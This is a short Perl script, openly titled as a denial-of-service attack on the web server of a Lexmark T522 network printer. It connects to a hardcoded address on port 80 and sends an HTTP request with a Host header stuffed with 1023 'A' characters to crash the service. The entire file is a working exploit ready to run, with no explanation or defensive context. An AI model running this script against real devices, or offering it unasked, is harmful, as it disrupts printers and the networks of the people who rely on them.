#!/usr/bin/perl
#
# Denial of Service agains Lexmark T522 Network Printer Webserver
# by snakebyte / eric ( http://www.snake-basket.de )
use Socket;

$target = "192.168.0.54";
$port = "80";
$lamecode = "A" x 1023;

$iaddr = inet_aton($target);
$paddr = sockaddr_in($port, $iaddr)               || die "getprotobyname: $!\n";
$proto = getprotobyname("tcp")                    || die "getprotobyname: $!\n";
socket(SOCKET, PF_INET, SOCK_STREAM, $proto)      || die "socket: $!\n";
connect(SOCKET, $paddr)				  || die "connection attempt failed: $!\n";
send(SOCKET, "GET / HTTP/1.0\r\n", 0);
send(SOCKET, "Host: ".$lamecode."\r\n\r\n", 0);
close SOCKET;
